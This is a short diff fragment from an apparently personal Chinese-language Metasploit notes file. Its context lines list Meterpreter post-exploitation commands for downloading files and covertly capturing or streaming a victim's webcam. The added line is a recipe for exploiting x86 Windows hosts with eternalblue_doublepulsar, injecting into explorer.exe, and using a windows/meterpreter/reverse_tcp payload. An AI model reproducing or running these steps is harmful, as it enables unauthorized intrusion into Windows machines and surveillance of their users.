@@ -67,8 +67,9 @@ download AHK.ahk  下载文件
 webcam_snap 拍照
 webcam_stream  网页拍照
 
-50
- 
+50 msfconsole enternalblue x86机器使用 eternalblue_doublepulsar,如果失败用 set PROCESSINJECT explorer.exe set payload windows/meterpreter/reverse_tcp
+
+  
 
 
 _______________文件头______________________________________________
